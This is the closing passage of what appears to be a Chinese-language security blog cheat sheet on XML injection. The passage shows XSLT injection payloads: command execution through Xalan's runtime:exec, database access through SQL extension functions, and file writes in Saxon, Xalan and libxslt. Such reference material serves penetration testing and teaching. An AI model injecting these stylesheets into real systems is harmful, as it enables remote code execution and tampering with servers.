<span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        Date: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;date:new ()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime ()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec ($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor ($process)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSLT- 连接数据库"><a href="#XSLT- 连接数据库" class="headerlink" title="XSLT 连接数据库"></a>XSLT 连接数据库</h3><p>Xalan-Java 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">select</span>= <span class="string">&quot;&#x27;com.mysql.jdbc.Driver&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;dbUrl&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;jdbc:mysql://localhost/xslt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltuser&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;pw&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltpw&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;select test from xtable&#x27;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;dbc&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:new ($driver, $dbUrl , $user, $pw)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;table&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:query ($dbc, $query)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$table/*&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;sql:close ($dbc)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSLT- 写入文件"><a href="#XSLT- 写入文件" class="headerlink" title="XSLT 写入文件"></a>XSLT 写入文件 </h3><p> 若写入成功，则无任何输出，写入失败则报错。</p>
<p>Saxon 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:result-document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:result-document</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Xalan-Java 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:open</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:write</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span>Hello world to local file.<span class="tag">&lt;/<span class="name">redirect:open</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:close</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>libxslt 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exsl:document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exsl:document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Saxon PE/Saxon EE 环境：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;local_file.txt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;Hello World to local file.&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:sequence</span> <span class="attr">select</span>=<span class="string">&quot;file:append-text ($file, $text)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其他可以写入文件的函数有 <code>file:append-text (), file:move (), file:copy (), file:delete (), file:exists (), file:is-file (), file:is-dir (), file:read (), file:write ()</code></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CheatSheet/" rel="tag"># CheatSheet</a>
              <a href="/tags/Web/" rel="tag"># Web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/04/25/SSRF-CheatSheet/" rel="prev" title="SSRF CheatSheet">
      <i class="fa fa-chevron-left"></i> SSRF CheatSheet
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/" rel="next" title="Web Server Environment Configuration CheatSheet">
      Web Server Environment Configuration CheatSheet <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93"><span class="nav-number">1.1.1.</span> <span class="nav-text">普通实体 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%A4%96%E9%83%A8%20-DTD"><span class="nav-number">1.1.2.</span> <span class="nav-text">参数实体外部 DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%AE%9E%E4%BD%93%E5%A4%96%E9%83%A8%20-DTD"><span class="nav-number">1.1.3.</span> <span class="nav-text">普通实体外部 DTD</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payload"><span class="nav-number">1.2.</span> <span class="nav-text">Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOS"><span class="nav-number">1.2.1.</span> <span class="nav-text">DOS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">1.2.2.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE-%20%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.3.</span> <span class="nav-text">XXE 盲注 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.4.</span> <span class="nav-text">报错注入 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SOAP"><span class="nav-number">1.2.5.</span> <span class="nav-text">SOAP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%20-Payload"><span class="nav-number">1.2.6.</span> <span class="nav-text">其他 Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">XML 注入 </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XPath-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">XPath 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.1.</span> <span class="nav-text">盲注 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.1.1.</span> <span class="nav-text"> 布尔盲注 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%20%E5%A4%96%E5%B8%A6"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">HTTP 外带 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-%20%E5%A4%96%E5%B8%A6"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">DNS 外带 </span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">1.5.2.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XPath-%20%E8%AF%AD%E6%B3%95%E9%80%9F%E6%9F%A5"><span class="nav-number">1.5.3.</span> <span class="nav-text">XPath 语法速查 </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8A%82%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">节点类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%AE%9A%E8%AF%AD"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">限定语 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">通配符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%9A%E8%B7%AF%E5%BE%84%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.5.3.5.</span> <span class="nav-text">多路径查询</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XQuery-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">XQuery 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSD-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.7.</span> <span class="nav-text">XSD 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-schemaLocation"><span class="nav-number">1.7.1.</span> <span class="nav-text">XSD schemaLocation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-noNamespaceSchemaLocation"><span class="nav-number">1.7.2.</span> <span class="nav-text">XSD noNamespaceSchemaLocation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-Include-import"><span class="nav-number">1.7.3.</span> <span class="nav-text">XSD Include&#x2F;import</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XInclude"><span class="nav-number">1.7.4.</span> <span class="nav-text">XInclude</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSD-%20%E6%8A%A5%E9%94%99"><span class="nav-number">1.7.5.</span> <span class="nav-text">XSD 报错</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSLT-%20%E6%B3%A8%E5%85%A5"><span class="nav-number">1.8.</span> <span class="nav-text">XSLT 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%20-XSLT-%20%E4%BF%A1%E6%81%AF"><span class="nav-number">1.8.1.</span> <span class="nav-text">获取 XSLT 信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-Stylesheet"><span class="nav-number">1.8.2.</span> <span class="nav-text">XSLT Stylesheet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-Include-import"><span class="nav-number">1.8.3.</span> <span class="nav-text">XSLT Include&#x2F;import</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.4.</span> <span class="nav-text">XSLT 读取文件 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-RCE"><span class="nav-number">1.8.5.</span> <span class="nav-text">XSLT RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.8.6.</span> <span class="nav-text">XSLT 连接数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSLT-%20%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-number">1.8.7.</span> <span class="nav-text">XSLT 写入文件 </span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Srpopty</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Srpopty</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'fb9b672afa74e328fbe8',
      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
      repo        : 'srpopty.github.io',
      owner       : 'Srpopty',
      admin       : ['Srpopty'],
      id          : 'ae7d8d473bbe365a7c25cebaa73f8a9d',
        language: 'zh-CN',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
